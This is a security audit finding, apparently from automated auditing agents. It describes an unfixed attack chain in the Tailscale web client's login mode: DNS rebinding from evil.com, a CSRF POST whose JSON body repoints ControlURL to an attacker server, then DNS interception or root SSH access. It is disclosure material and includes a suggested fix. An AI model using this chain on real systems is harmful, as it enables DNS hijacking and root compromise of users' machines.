title: CHAIN: login-mode web client lacks anti-DNS-rebinding guard -> CSRF repoint to attacker control server -> DNS MITM (default) up to root RCE
status: CONFIRMED reachability + impact ceiling by source analysis
upstream_status: UNFIXED on origin/main (no post-tag client/web changes)

root_cause.bug: requireTailscaleIP (Host/anti-DNS-rebinding guard) and the CSP/X-Frame-Options headers run ONLY in ManageServerMode (web.go:335,348). In login/readonly mode (`tailscale web`, default localhost:8088) authorizeRequest returns true unconditionally; the only mutation defense is csrfProtect, which a same-origin DNS-rebound page (evil.com:8088 -> 127.0.0.1) satisfies (Sec-Fetch-Site: same-origin, or Origin==Host both = evil.com:8088). This is the CVE-2022-41924 anti-rebinding class, present in manage mode but ABSENT in login mode.
root_cause.reachable_sink: serveLoginAPI (web.go:519) routes POST /api/up -> serveTailscaleUp with no session.

repoint_mechanics.running_node: IMMUNE: ControlURL EditPrefs is inside `if !isRunning` (web.go:1173-1185); a Running node returns early and ControlURL is never set.
repoint_mechanics.non_running_node: Attacker POSTs {"Reauthenticate":true,"ControlURL":"https://attacker","AuthKey":"..."}; !isRunning true -> EditPrefs(ControlURL) + Start(AuthKey). Non-running (NeedsLogin/Stopped/NoState) is the normal state when `tailscale web` login is used.

impact_ceiling_after_repoint.default_on: FULL DNS INTERCEPTION (HIGH): --accept-dns/CorpDNS defaults true (prefs.go:747). Malicious control sets DNSConfig.Resolvers=[attacker] -> overrides resolution for ALL domains (manager.go:378, resolved.go:322). No attacker-controlled file write (resolv.conf lines FQDN-validated).
impact_ceiling_after_repoint.if_ssh_enabled: ROOT RCE (CRITICAL): nm.SSHPolicy taken from netmap with no signature (tailssh.go:606); gated only by local RunSSH pref. Control authors {Principals:[{Any}], SSHUsers:{"*":"root"}, Accept} -> interactive root shell via incubator.
impact_ceiling_after_repoint.if_remoteconfig_enabled: FULL TAKEOVER (CRITICAL, default OFF): feature/remoteconfig handleC2NRemoteAPI proxies into LocalAPI with PermitRead+PermitWrite+Actor Self (remoteconfig.go:86); control can PATCH prefs to set RunSSH=true then do the SSH chain even if SSH was off.
impact_ceiling_after_repoint.not_reachable: exit-node/subnet-route L3 MITM requires user prefs ExitNodeID/RouteAll (routemanager.go:827); not auto-accepted from netmap.

preconditions_summary: victim ran `tailscale web` (login mode) + node non-running at CSRF time + browser permits public->127.0.0.1 rebinding (modern PNA may block) ; RCE additionally needs --ssh or RemoteConfig.
fix: apply requireTailscaleIP (or a synthesized CSRF token + CSP/XFO) to login/readonly mode too; mirror manage mode's Host allowlist.
credit_auditor: webclient agent + malicious-control-ceiling agent + distsign negative (ev08)
